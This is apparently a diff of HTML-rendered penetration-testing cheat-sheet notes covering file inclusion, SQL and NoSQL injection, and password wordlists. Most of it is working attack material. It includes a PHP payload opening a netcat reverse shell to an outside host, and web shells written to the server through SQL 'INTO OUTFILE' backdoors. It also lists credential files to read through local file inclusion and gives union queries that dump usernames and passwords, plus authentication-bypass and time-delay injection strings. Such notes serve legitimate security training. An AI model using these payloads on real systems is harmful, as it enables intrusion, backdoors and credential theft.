+&lt;h4&gt;Websites: RFI&lt;/h4&gt;
+&lt;p&gt;Is unsanitized php passed to the PHP &lt;code&gt;include&lt;/code&gt; function &amp;amp; php.ini file &amp;gt; allow remote files?&lt;/p&gt;
+&lt;p&gt;/etc/php5/cgi/php.ini - &lt;code&gt;allow_url_fopen&lt;/code&gt; and &lt;code&gt;allow_url_include&lt;/code&gt; both set to &lt;code&gt;on&lt;/code&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="x"&gt;include($_REQUEST[&amp;quot;file&amp;quot;].&amp;quot;.php&amp;quot;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h5&gt;RFI: Host evil.txt on apache and serve it as the LANG file&lt;/h5&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nb"&gt;shell_exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;“nc&lt;/span&gt; &lt;span class="nx"&gt;–nv&lt;/span&gt; &lt;span class="mf"&gt;10.11&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;0.160&lt;/span&gt; &lt;span class="mi"&gt;4444&lt;/span&gt; &lt;span class="nx"&gt;–e&lt;/span&gt; &lt;span class="nx"&gt;cmd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;exe&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;);?&amp;gt; # evil.txt on apache&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;nc –nvlp 4444 # set up listener&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code&gt;http://10.11.15.54/addguestbook.php?name=a&amp;amp;comment=b&amp;amp;LANG=http://10.11.0.160/evil.txt%00&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Or&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;http://192.168.11.35/addguestbook.php?name=a&amp;amp;comment=b&amp;amp;LANG=http://192.168.10.5/evil.txt&lt;/code&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nx"&gt;shell\_exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ipconfig&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;If a phpinfo() file is present, it’s usually possible to get a shell: Find the phpinfo() file&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nb"&gt;shell_exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt; # Contaminating Log Files&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h5&gt;LFI Linux Files:&lt;/h5&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;/etc/issue
+/proc/version
+/etc/profile
+/etc/passwd
+/etc/shadow
+/root/.bash_history
+/var/log/dmessage
+/var/mail/root
+/var/spool/cron/crontabs/root
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h5&gt;LFI Windows Files:&lt;/h5&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;%SYSTEMROOT%&lt;span class="se"&gt;\r&lt;/span&gt;epair&lt;span class="se"&gt;\s&lt;/span&gt;ystem
+%SYSTEMROOT%&lt;span class="se"&gt;\r&lt;/span&gt;epair&lt;span class="se"&gt;\S&lt;/span&gt;AM
+%SYSTEMROOT%&lt;span class="se"&gt;\r&lt;/span&gt;epair&lt;span class="se"&gt;\S&lt;/span&gt;AM
+%WINDIR%&lt;span class="se"&gt;\w&lt;/span&gt;in.ini
+%SYSTEMDRIVE%&lt;span class="se"&gt;\b&lt;/span&gt;oot.ini
+%WINDIR%&lt;span class="se"&gt;\P&lt;/span&gt;anther&lt;span class="se"&gt;\s&lt;/span&gt;ysprep.inf
+%WINDIR%&lt;span class="se"&gt;\s&lt;/span&gt;ystem32&lt;span class="se"&gt;\c&lt;/span&gt;onfig&lt;span class="se"&gt;\A&lt;/span&gt;ppEvent.Evt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h5&gt;LFI OSX Files:&lt;/h5&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;/etc/fstab
+master.passwd
+resolv.conf
+sudoers
+sysctl.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;Websites SQLi + Databases&lt;/h4&gt;
+&lt;p&gt;Enumerating MySQL database in URL&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;mysql&lt;/span&gt; &lt;span class="err"&gt;–&lt;/span&gt;&lt;span class="n"&gt;u&lt;/span&gt; &lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;use&lt;/span&gt; &lt;span class="n"&gt;webappdb&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;select&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="n"&gt;users&lt;/span&gt;
+&lt;span class="k"&gt;select&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="n"&gt;users&lt;/span&gt; &lt;span class="k"&gt;where&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="err"&gt;‘&lt;/span&gt;&lt;span class="n"&gt;wronguser&lt;/span&gt;&lt;span class="err"&gt;’&lt;/span&gt; &lt;span class="k"&gt;or&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="o"&gt;#&lt;/span&gt; &lt;span class="k"&gt;and&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;wrongpass&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;URL&lt;/span&gt; &lt;span class="nx"&gt;vulnerability&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nx"&gt;GET&lt;/span&gt; &lt;span class="nx"&gt;requests&lt;/span&gt; 
+&lt;span class="nx"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//127.0.0.1/comment.php?id=735`&lt;/span&gt;
+
+&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;order&lt;/span&gt; &lt;span class="nx"&gt;by&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;col&lt;/span&gt; &lt;span class="nx"&gt;enumeration&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;works&lt;/span&gt; &lt;span class="nx"&gt;fine&lt;/span&gt;
+&lt;span class="nx"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//127.0.0.1/comment.php?id=735&lt;/span&gt;
+
+&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;order&lt;/span&gt; &lt;span class="nx"&gt;by&lt;/span&gt; &lt;span class="mf"&gt;7.&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;Breaks&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="nx"&gt;Pick&lt;/span&gt; &lt;span class="nx"&gt;display&lt;/span&gt; &lt;span class="nx"&gt;field&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;eg5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="nx"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//127.0.0.1/comment.php?id=735 &lt;/span&gt;
+
+&lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="nx"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;735&lt;/span&gt; &lt;span class="nx"&gt;uinion&lt;/span&gt; &lt;span class="nx"&gt;all&lt;/span&gt; &lt;span class="nx"&gt;select&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="err"&gt;@@&lt;/span&gt;&lt;span class="nx"&gt;version&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nx"&gt;user&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;  &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;Col&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;permit&lt;/span&gt; &lt;span class="nx"&gt;UNION&lt;/span&gt; &lt;span class="nx"&gt;ALL&lt;/span&gt; &lt;span class="nx"&gt;SELECT&lt;/span&gt;
+
+&lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="nx"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;735&lt;/span&gt; &lt;span class="nx"&gt;uinion&lt;/span&gt; &lt;span class="nx"&gt;all&lt;/span&gt; &lt;span class="nx"&gt;select&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;user&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;
+
+&lt;span class="err"&gt;…&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;table_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="nx"&gt;FROM&lt;/span&gt; &lt;span class="nx"&gt;information_schema&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;tables&lt;/span&gt;
+
+&lt;span class="err"&gt;…&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;column_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="nx"&gt;FROM&lt;/span&gt; &lt;span class="nx"&gt;information_schema&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;columns&lt;/span&gt; &lt;span class="nx"&gt;where&lt;/span&gt; &lt;span class="nx"&gt;table_name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;users&amp;#39;&lt;/span&gt;
+
+&lt;span class="err"&gt;…&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;concat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;0x3a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;password&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="nx"&gt;FROM&lt;/span&gt; &lt;span class="nx"&gt;users&lt;/span&gt;
+
+&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;Reverse&lt;/span&gt; &lt;span class="nx"&gt;shell&lt;/span&gt;&lt;span class="err"&gt;…&lt;/span&gt; &lt;span class="nx"&gt;SQL&lt;/span&gt; &lt;span class="nx"&gt;puts&lt;/span&gt; &lt;span class="nx"&gt;code&lt;/span&gt; &lt;span class="nx"&gt;to&lt;/span&gt; &lt;span class="nx"&gt;file&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;code&lt;/span&gt; &lt;span class="nx"&gt;execution&lt;/span&gt;
+&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;put&lt;/span&gt; &lt;span class="nx"&gt;php&lt;/span&gt; &lt;span class="nx"&gt;shell_exec&lt;/span&gt; &lt;span class="nx"&gt;into&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;file&lt;/span&gt; &lt;span class="nx"&gt;on&lt;/span&gt; &lt;span class="nx"&gt;server&lt;/span&gt;
+&lt;span class="err"&gt;…&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nb"&gt;shell_exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;‘cmd’&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="nx"&gt;into&lt;/span&gt; &lt;span class="nx"&gt;OUTFILE&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;c:/xamp/htdocs/backdoor.php&amp;#39;&lt;/span&gt;
+
+&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;setup&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt; &lt;span class="nx"&gt;listener&lt;/span&gt;
+&lt;span class="nx"&gt;nc&lt;/span&gt; &lt;span class="err"&gt;–&lt;/span&gt;&lt;span class="nx"&gt;nlvp&lt;/span&gt; &lt;span class="mi"&gt;4444&lt;/span&gt; 
+&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;execute&lt;/span&gt;
+&lt;span class="nx"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//127.0.0.1/backdoor.php?cmd=nc –nv 10.11.0.160 4444 –e cmd.exe&lt;/span&gt;
+
+&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;Local&lt;/span&gt; &lt;span class="nx"&gt;web&lt;/span&gt; &lt;span class="nx"&gt;proxy&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;POST&lt;/span&gt; &lt;span class="nx"&gt;requests&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;non&lt;/span&gt; &lt;span class="nx"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;Tamper&lt;/span&gt; &lt;span class="nx"&gt;Data&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;intercepts&lt;/span&gt; &lt;span class="nx"&gt;HTTP&lt;/span&gt; &lt;span class="nx"&gt;request&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;edit&lt;/span&gt; &lt;span class="nx"&gt;parameters&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;bypassing&lt;/span&gt; &lt;span class="nx"&gt;client&lt;/span&gt; &lt;span class="nx"&gt;side&lt;/span&gt; &lt;span class="nx"&gt;restrictions&lt;/span&gt;
+&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;place&lt;/span&gt; &lt;span class="nx"&gt;php&lt;/span&gt; &lt;span class="nx"&gt;shell_exec&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="nx"&gt;file&lt;/span&gt; &lt;span class="nx"&gt;on&lt;/span&gt; &lt;span class="nx"&gt;server&lt;/span&gt;
+&lt;span class="nx"&gt;en&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;union all select 1,2,3,4,&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nb"&gt;shell_exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="s1"&gt;&amp;quot;,6 into OUTFILE &amp;#39;&lt;/span&gt;&lt;span class="nx"&gt;c&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="err"&gt;/xampp/htdocs/new_backdoor.php%00&amp;#39;&amp;#39;&lt;/span&gt;
+
+&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;setup&lt;/span&gt; &lt;span class="nx"&gt;listener&lt;/span&gt;
+&lt;span class="nx"&gt;nc&lt;/span&gt; &lt;span class="err"&gt;–&lt;/span&gt;&lt;span class="nx"&gt;nlvp&lt;/span&gt; &lt;span class="mi"&gt;4444&lt;/span&gt; 
+
+&lt;span class="nx"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//10.11.15.54//new_backdoor.php?cmd=nc -nv 10.11.0.160 4444 -e cmd.exe&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h5&gt;Mysql Queries: 30s delay to MSSQL, MYSQL, POSTGRESQL&lt;/h5&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;# Original Query&lt;/span&gt;
+&lt;span class="err"&gt;SELECT * FROM products WHERE name=&amp;#39;Test&amp;#39;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h5&gt;Injection values&lt;/h5&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nt"&gt;MSSQL&lt;/span&gt;
+&lt;span class="s1"&gt;&amp;#39;; WAITFOR DELAY &amp;#39;&lt;/span&gt;&lt;span class="nt"&gt;00&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;00&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;30&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;;&lt;/span&gt;
+
+&lt;span class="s1"&gt;# MYSQL&lt;/span&gt;
+&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="nt"&gt;-SLEEP&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;30&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+
+&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nt"&gt;POSTGRESQL&lt;/span&gt;
+&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;SELECT&lt;/span&gt; &lt;span class="nt"&gt;pg_sleep&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;30&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h5&gt;Resulting queries&lt;/h5&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;#&lt;/span&gt; &lt;span class="n"&gt;MSSQL&lt;/span&gt;
+&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;products&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Test&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;WAITFOR&lt;/span&gt; &lt;span class="n"&gt;DELAY&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;00:00:30&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+&lt;span class="o"&gt;#&lt;/span&gt; &lt;span class="n"&gt;MYSQL&lt;/span&gt;
+&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;products&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Test&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;SLEEP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+&lt;span class="o"&gt;#&lt;/span&gt; &lt;span class="n"&gt;POSTGRESQL&lt;/span&gt;
+&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;products&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Test&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;pg_sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h5&gt;Grab password hashes from mysqldb called –if you have MySQL root username &amp;amp; password&lt;/h5&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;mysql -u root -p -h &lt;span class="nv"&gt;$ip&lt;/span&gt; use &lt;span class="s2"&gt;&amp;quot;Users&amp;quot;&lt;/span&gt; show tables&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;select&lt;/span&gt; &lt;span class="se"&gt;\*&lt;/span&gt; from users&lt;span class="p"&gt;;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h5&gt;Authentication Bypass&lt;/h5&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;wronguser&amp;#39;&lt;/span&gt; or &lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;wronguser&amp;#39;&lt;/span&gt; or &lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; LIMIT &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h5&gt;NoSQL&lt;/h5&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;git clone https://github.com/codingo/NoSQLMap.git 
+pip install couchdb&lt;span class="p"&gt;;&lt;/span&gt; pip install pbkdf2&lt;span class="p"&gt;;&lt;/span&gt; pip install ipcalc 
+python nosqlmap.py
+a&lt;span class="s1"&gt;&amp;#39;; return this.a != &amp;#39;&lt;/span&gt;BadData’&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; var &lt;span class="nv"&gt;dummy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;‘!&lt;span class="sb"&gt;`&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h5&gt;Mdbtools&lt;/h5&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;mdb-sql backup.mdb
+list table&lt;span class="p"&gt;;&lt;/span&gt; go
+mdb-tables backup.mdb
+&lt;span class="k"&gt;for&lt;/span&gt; i in &lt;span class="k"&gt;$(&lt;/span&gt;mdb-tables backup.mdb&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; mdb-export backup.mdb &lt;span class="nv"&gt;$i&lt;/span&gt; &amp;gt; tables/&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;
+wc –l  *&lt;span class="p"&gt;|&lt;/span&gt; sort –n &lt;span class="c1"&gt;# ignore one liners&lt;/span&gt;
+cat auth_user &lt;span class="c1"&gt;# table&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;Passwords&lt;/h3&gt;
+&lt;p&gt;For identifying hashes can use hashes.org, hash-identifier.&lt;/p&gt;
+&lt;h4&gt;Find/examine wordlists&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;find . -name &lt;span class="s1"&gt;&amp;#39;*.txt&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; xargs wc -l
+wc -l **/*
+locate tomcat &lt;span class="p"&gt;|&lt;/span&gt;grep pass*.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
